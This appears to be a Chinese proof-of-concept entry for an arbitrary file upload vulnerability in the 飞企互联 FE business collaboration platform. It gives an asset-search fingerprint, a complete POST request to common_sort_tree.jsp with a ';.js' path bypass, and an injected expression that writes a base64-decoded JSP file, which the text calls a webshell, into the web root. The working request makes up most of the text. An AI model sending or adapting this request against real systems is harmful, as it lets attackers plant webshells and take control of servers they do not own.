# 飞企互联FE业务协作平台common_sort_tree存在任意文件上传漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /common/common_sort_tree.jsp;.js HTTP/1.1`

**请求体 / payload**
```
其中红圈为`webshell`base64编码
Host: xx.xx.xx.xx
Cookie: JSESSIONID=DDA007F5B06EF7B049214B54838A17F8
Content-Type: application/x-www-form-urlencoded
Content-Length: 290
rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/stc.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("PCUgb3V0LnByaW50bG4oMTExKjExMSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg=="))%25}

上传文件位置
/stc.jsp;.js
```

**其他**
- 飞企互联FE业务协作平台common\_sort\_tree存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台